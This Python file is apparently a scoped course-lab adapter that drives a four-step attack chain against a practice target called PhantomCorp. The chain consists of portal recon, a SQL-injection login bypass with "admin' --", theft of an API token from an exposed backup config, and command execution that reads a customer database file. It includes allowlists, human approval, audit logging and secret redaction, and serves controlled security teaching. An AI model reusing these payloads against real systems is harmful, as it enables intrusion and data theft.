"""Adaptador activo mínimo para el laboratorio PhantomCorp de la cátedra."""
from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, cast

from harness.audit import AuditIntegrityError, AuditLog, AuditRecoveryRequired, AuditUnavailable
from harness.contracts import (
    Action,
    Guard,
    Harness,
    KillSwitch,
    ScopeViolation,
    ToolAdapter,
    ToolExecutionError,
)
from harness.roe import fixture_roe_yaml, parse_roe
from harness.types import Phase, ScopeToken

_R4_COMMAND = "cat /app/priv/clientes.db.txt"
_MARKERS = {"R1": "final_recon_portal", "R2": "final_sqli_foothold", "R3": "final_token_looted", "R4": "final_crown_jewels"}
_TOKEN_PATTERN = re.compile(r"(?i)(?:API_TOKEN|DB_PASS|DB_USER|token)\s*[=:]\s*[^\s&]+")
_FLAG_PATTERN = re.compile(r"FLAG\{[^}]*\}")
_SECRET_PATTERN = re.compile(r"(?i)(?:password|pass|secret|token)\s*[=:]\s*[^\s&]+")


class EvidenceError(RuntimeError):
    pass


def _sanitize(text: str) -> str:
    text = _FLAG_PATTERN.sub("[redacted]", text)
    text = _TOKEN_PATTERN.sub("[redacted]", text)
    text = _SECRET_PATTERN.sub("[redacted]", text)
    return text[:2000]


class ActivePhantomCorp(ToolAdapter):
    name = "phantomcorp.active.fixed_catalog"
    allowed_phases = (Phase.RECON, Phase.CORRELATE, Phase.ANALYZE)
    destructive = False

    def __init__(self, base_url: str, *, timeout: float = 5):
        parsed = urllib.parse.urlparse(base_url)
        if parsed.scheme not in {"http", "https"} or parsed.hostname not in {"phantomcorp", "phantomcorp.test", "localhost", "127.0.0.1"}:
            raise ValueError("target_must_be_phantomcorp")
        if parsed.hostname in {"localhost", "127.0.0.1"} and parsed.port is None:
            raise ValueError("localhost_port_required")
        self.base_url, self.timeout, self.calls = base_url.rstrip("/"), timeout, 0
        self.last_error: str | None = None
        self._api_token: str | None = None

    def _url(self, path: str) -> str:
        return self.base_url + path

    def request(self, step: str, **kwargs: str) -> tuple[int, str]:
        self.calls += 1
        if step == "R1":
            request = urllib.request.Request(self._url("/portal-rrhh"), method="GET")
        elif step == "R2":
            data = urllib.parse.urlencode({"user": "admin' --", "pass": "x"}).encode()
            request = urllib.request.Request(self._url("/portal/login"), data=data, method="POST")
        elif step == "R3":
            request = urllib.request.Request(self._url("/backup/rrhh.conf"), method="GET")
        elif step == "R4":
            if kwargs.get("command") != _R4_COMMAND:
                self.last_error = "command_not_in_catalog"
                raise EvidenceError(self.last_error)
            token = kwargs.get("token") or self._api_token
            if token is None:
                self.last_error = "missing_collected_token"
                raise EvidenceError(self.last_error)
            query = urllib.parse.urlencode({"token": token, "cmd": _R4_COMMAND})
            request = urllib.request.Request(self._url("/api/reporte?" + query), method="GET")
        else:
            self.last_error = "step_not_in_catalog"
            raise EvidenceError(self.last_error)
        try:
            with urllib.request.urlopen(request, timeout=self.timeout) as response:
                return response.status, response.read(32769).decode("utf-8", "replace")
        except urllib.error.HTTPError as error:
            return error.code, error.read(32769).decode("utf-8", "replace")
        except (OSError, UnicodeError):
            raise ToolExecutionError("target_unavailable") from None

    def run(self, action: Any, target: str, token: ScopeToken) -> dict[str, Any]:
        if target not in {"phantomcorp", "phantomcorp.test", "localhost"}:
            raise ScopeViolation("target_not_in_active_catalog")
        step = action.name.rsplit(".", 1)[-1]
        status, body = self.request(step, **(action.parameters or {}))
        marker = _MARKERS[step]
        if marker not in body:
            self.last_error = f"unexpected_response_{step}"
            raise EvidenceError(self.last_error)
        if step == "R3":
            token_match = re.search(r"API_TOKEN=([^\s&]+)", body)
            if token_match is None:
                self.last_error = "token_not_collected"
                raise EvidenceError(self.last_error)
            self._api_token = token_match.group(1)
        return {"milestone": step, "http_status": status, "marker": marker,
                "summary": _summarize(step, body), "response_sha256": hashlib.sha256(body.encode()).hexdigest()}


def _summarize(step: str, body: str) -> str:
    clean = _sanitize(body)
    if step == "R4":
        match = re.search(r"clientes:\s*[^\n]+", clean)
        return match.group(0) if match else "impacto observado; [redacted]"
    if step == "R1":
        return "portal interno localizado; marcador observado"
    if step == "R2":
        return "acceso administrativo sin credencial válida; marcador observado"
    return "archivo de configuración accesible; marcador observado"


def run_active(target: ActivePhantomCorp, output: Path, *, approved: bool, r4_command: str = _R4_COMMAND) -> dict[str, Any]:
    result: dict[str, Any] = {"state": "PENDING_HITL", "target": "phantomcorp", "requests": 0,
                              "evidence": [], "confirmed_findings": [], "active": True}
    if not approved:
        output.mkdir(parents=True)
        (output / "result.json").write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
        return result
    if r4_command != _R4_COMMAND:
        result.update(state="FAILED", reason="command_not_in_catalog")
        output.mkdir(parents=True)
        result["requests"] = 3
        (output / "result.json").write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
        return result
    output.mkdir(parents=True)
    roe = parse_roe(fixture_roe_yaml())
    issuer = __import__("harness.roe", fromlist=["TokenIssuer"]).TokenIssuer(roe, approved_fixture=True)
    token = issuer.issue(Phase.RECON)
    with AuditLog(output / "audit.db", roe.engagement_id) as audit:
        guard = Guard({phase: {f"phantomcorp.active.{step}" for step in _MARKERS} for phase in ActivePhantomCorp.allowed_phases},
                      issued_by=issuer.accepts)
        adapter = target
        tools = cast(dict[str, ToolAdapter], {f"phantomcorp.active.{step}": adapter for step in _MARKERS})
        harness = Harness(guard, audit, tools, KillSwitch())
        current_token = token
        try:
            for step in ("R1", "R2", "R3", "R4"):
                phase = Phase.RECON if step == "R1" else Phase.ANALYZE
                if phase != current_token.phase:
                    current_token = issuer.issue(phase)
                action = Action(f"phantomcorp.active.{step}", phase)
                if step == "R4":
                    # The catalog is selected by code; it is not model-controlled.
                    action = Action(action.name, phase, parameters={"command": _R4_COMMAND})
                result["evidence"].append(harness.invoke("active-lab", action, "phantomcorp.test", current_token))
        except (EvidenceError, ToolExecutionError, ScopeViolation, AuditUnavailable) as error:
            result.update(state="FAILED", reason=target.last_error or str(error))
        result["requests"] = adapter.calls
        result["audit"] = audit.verify()
    (output / "result.json").write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
    return result


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--output", required=True, type=Path)
    parser.add_argument("--approve-lab", action="store_true")
    args = parser.parse_args()
    try:
        result = run_active(ActivePhantomCorp(args.base_url), args.output, approved=args.approve_lab)
    except (ValueError, OSError, AuditIntegrityError, AuditRecoveryRequired) as error:
        print(f"active_blocked: {type(error).__name__}", file=sys.stderr)
        return 2
    print(json.dumps({key: result[key] for key in ("state", "requests", "reason") if key in result}))
    return 0 if result["state"] == "PENDING_HITL" and len(result["evidence"]) == 4 else 3


if __name__ == "__main__":
    raise SystemExit(main())
